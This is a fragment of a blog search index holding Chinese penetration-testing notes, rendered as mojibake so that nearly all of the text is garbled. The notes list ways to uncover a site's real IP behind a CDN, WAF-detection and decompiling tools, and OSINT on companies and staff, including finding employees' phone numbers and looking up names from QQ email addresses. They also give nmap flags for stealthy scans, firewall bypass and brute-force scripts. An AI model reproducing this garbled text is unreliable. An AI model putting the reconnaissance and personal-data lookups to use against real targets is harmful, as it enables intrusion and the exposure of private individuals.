id="CDNçš„ç»•è¿‡æ–¹æ³•"><a href="#CDNçš„ç»•è¿‡æ–¹æ³•" class="headerlink" title="CDNçš„ç»•è¿‡æ–¹æ³•"></a>CDNçš„ç»•è¿‡æ–¹æ³•</h2><p>é‚®ä»¶æŸ¥è¯¢ã€‚å¯ä»¥é€šè¿‡å¯¹æ–¹å‘é€çš„é‚®ä»¶æŸ¥çœ‹å¯¹æ–¹çœŸå®ip</p><p>ä½¿ç”¨å›½å¤–ip pingç›®æ ‡ç½‘å€</p><p>å­åŸŸåä¸€èˆ¬æ²¡æœ‰CDNã€‚é€šè¿‡å­åŸŸåæŸ¥è¯¢å¯æŸ¥è¯¢çœŸå®ip</p><p>å°ç¨‹åºä¸€èˆ¬æ²¡æœ‰CDN</p><p>DNSå†å²è§£æã€‚ç›®æ ‡ç½‘ç«™åœ¨åˆ›å»ºæ—¶å¯èƒ½æœªä½¿ç”¨CDNï¼ˆå¾®æ­¥åœ¨çº¿ï¼‰</p><p>æš—é»‘å¼•æ“æœç´¢ï¼ˆhtmlæºä»£ç æ ‡ç­¾ï¼‰</p><p>æ•æ„Ÿæ–‡ä»¶æŸ¥æ‰¾ã€‚æ•æ„Ÿæ–‡ä»¶å¯èƒ½ä¼šè®°å½•ç›®æ ‡ç½‘ç«™çš„çœŸå®ipåœ°å€æˆ–ç»å¯¹è·¯å¾„ï¼Œé€šè¿‡æŸ¥æ‰¾ç›®æ ‡ç½‘ç«™ç›¸å…³çš„æ•æ„Ÿæ–‡ä»¶ï¼ˆæ¢é’ˆã€phpinfo.phpï¼‰å¯è·å–çœŸå®ipåœ°å€</p><p>å…¨ç½‘æ‰«æï¼ˆå·¥å…·ï¼‰</p><p><a href="https://anonymousemail.me/">https://anonymousemail.me</a> åŒ¿åé‚®ç®±</p><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn</a> å¾®æ­¥åœ¨çº¿</p><p><a href="http://www.fofa.info/">www.fofa.info</a> æš—é»‘å¼•æ“</p><p><a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a> å…¨ç½‘æ‰«æå·¥å…·ï¼ˆæ˜“è¯­è¨€ï¼‰</p><p><a href="https://www.lanzous.com/iao7mh">https://www.lanzous.com/iao7mh</a>  å…¨ç½‘æ‰«æå·¥å…·ï¼ˆpython2ï¼‰</p><p>å¥‡å®‰ä¿¡é¹°é€”</p><p>shandan</p><p>é’Ÿé¦—ä¹‹çœ¼</p><h2 id="wafè¯†åˆ«å·¥å…·"><a href="#wafè¯†åˆ«å·¥å…·" class="headerlink" title="wafè¯†åˆ«å·¥å…·"></a>wafè¯†åˆ«å·¥å…·</h2><p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><h1 id="appæœåŠ¡ç«¯æ¼æ´"><a href="#appæœåŠ¡ç«¯æ¼æ´" class="headerlink" title="appæœåŠ¡ç«¯æ¼æ´"></a>appæœåŠ¡ç«¯æ¼æ´</h1><h2 id="åç¼–è¯‘"><a href="#åç¼–è¯‘" class="headerlink" title="åç¼–è¯‘"></a>åç¼–è¯‘</h2><p>dex2jarã€Androidkiller</p><h2 id="æŠ“åŒ…"><a href="#æŠ“åŒ…" class="headerlink" title="æŠ“åŒ…"></a>æŠ“åŒ…</h2><h1 id="ä¿¡æ¯æ”¶é›†é‡ç‚¹"><a href="#ä¿¡æ¯æ”¶é›†é‡ç‚¹" class="headerlink" title="ä¿¡æ¯æ”¶é›†é‡ç‚¹"></a>ä¿¡æ¯æ”¶é›†é‡ç‚¹</h1><p><a href="https://www.tianyacha.com/">https://www.tianyacha.com</a> å¤©çœ¼æŸ¥</p><p><a href="https://www.qichacha.com/">https://www.qichacha.com</a> ä¼æŸ¥æŸ¥</p><p><a href="https://www.reg007.com/">https://www.reg007.com</a> æ³¨å†Œè¿‡çš„ç½‘ç«™æŸ¥è¯¢</p><p><a href="https://www.email-format.com/i/search">https://www.email-format.com/i/search</a> åœ¨çº¿é‚®ç®±æŸ¥è¯¢</p><p><a href="https://www.aies.cn/pinyin.htm">https://www.aies.cn/pinyin.htm</a> åœ¨çº¿æ±‰å­—è½¬æ‹¼éŸ³ï¼ˆåˆ¶ä½œå­—å…¸ï¼‰</p><p><a href="https://github.com/shack2/SNETracke/releases">https://github.com/shack2/SNETracke/releases</a> è¶…çº§å¼±å£ä»¤å·¥å…·</p><p><a href="https://anymousemail.me/">https://anymousemail.me</a> åŒ¿åé‚®ç®±</p><p>Maltego ç½‘ç«™èµ„äº§ç»“æ„ã€å‘˜å·¥æ‰‹æœºå·ã€é‚®ç®±</p><p>æ‹›è˜ç½‘</p><p>æ”¯ä»˜å®æ ¹æ®QQé‚®ç®±æŸ¥å§“å</p><p>jsä¿¡æ¯æ”¶é›† ç›¸å…³è„šæœ¬ï¼š<a href="https://github.com/Threezhl/JSFinder">https://github.com/Threezhl/JSFinder</a>  çˆ¬å–ç½‘ç«™jsæ–‡ä»¶ï¼Œæå–urlã€å­åŸŸå</p><h1 id="nmapçš„ä½¿ç”¨"><a href="#nmapçš„ä½¿ç”¨" class="headerlink" title="nmapçš„ä½¿ç”¨"></a>nmapçš„ä½¿ç”¨</h1><p>äº†è§£å¸¸è§ç«¯å£å·åŠå…¶å¯¹åº”ç«¯å£æœåŠ¡ä½œä¸ºä½¿ç”¨nmapçš„å‰ç½®çŸ¥è¯†</p><h2 id="nmapç”¨é€”"><a href="#nmapç”¨é€”" class="headerlink" title="nmapç”¨é€”"></a>nmapç”¨é€”</h2><p>å‘ç°ç½‘ç»œä¸Šçš„ä¸»æœºï¼›ç«¯å£æ‰«æï¼›osæ£€æµ‹ï¼›è½¯ä»¶è„šæœ¬æ£€æµ‹è„†å¼±æ€§çš„æ¼æ´</p><h2 id="å¸¸ç”¨æŒ‡ä»¤"><a href="#å¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="å¸¸ç”¨æŒ‡ä»¤"></a>å¸¸ç”¨æŒ‡ä»¤</h2><p>-sPï¼šè¿›è¡Œpingæ‰«æï¼Œæ‰«æç½‘æ®µå­˜æ´»æœºå™¨</p><p><strong>-sSï¼š synæ‰«æä¹Ÿå«åŠå¼€æ”¾æ‰«æï¼Œä¸ä¼šäº§ç”Ÿä¼šè¯ï¼Œå¯¹æ–¹éš¾ä»¥å‘ç°</strong> </p><p> -sTï¼š ä¸‰æ¬¡æ¡æ‰‹æ‰«æï¼Œå®¹æ˜“è¢«å‘ç°ï¼ŒåŸºæœ¬ä¸ç”¨</p><p>-sVï¼š æ‰«æç›®æ ‡ç«¯å£å¼€æ”¾çš„æœåŠ¡ç‰ˆæœ¬</p><p>-Oï¼š è¯†åˆ«ç›®æ ‡æ“ä½œç³»ç»Ÿç‰ˆæœ¬</p><p>-Aï¼š osè¯†åˆ«ï¼Œç‰ˆæœ¬æ¢æµ‹ï¼Œé™„å¸¦è„šæœ¬å’Œç»¼åˆæ‰«æ</p><p><strong>-Pn -Aï¼š ç»•è¿‡é˜²ç«å¢™è¿›è¡Œå…¨é¢æ‰«æ</strong></p><p>-T(1-6)ï¼šæ‰«æçº¿ç¨‹ï¼Œæ•°å­—è¶Šå¤§è¶Šå¿«</p><h2 id="å¸¸ç”¨è„šæœ¬"><a href="#å¸¸ç”¨è„šæœ¬" class="headerlink" title="å¸¸ç”¨è„šæœ¬"></a>å¸¸ç”¨è„šæœ¬</h2><p>authï¼šå¤„ç†é‰´æƒè¯ä¹¦ï¼ˆç»•å¼€é‰´æƒï¼‰æ£€æµ‹å¼±å£ä»¤</p><p>bruteï¼šæš´åŠ›ç ´è§£</p><p>vulnï¼šæ£€æµ‹æ˜¯å¦å­˜åœ¨å¸¸è§æ¼æ´</p><p>è„šæœ¬ä½¿ç”¨ï¼š-script è„šæœ¬å</p>]]></content>
      
      
      
        <tags>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
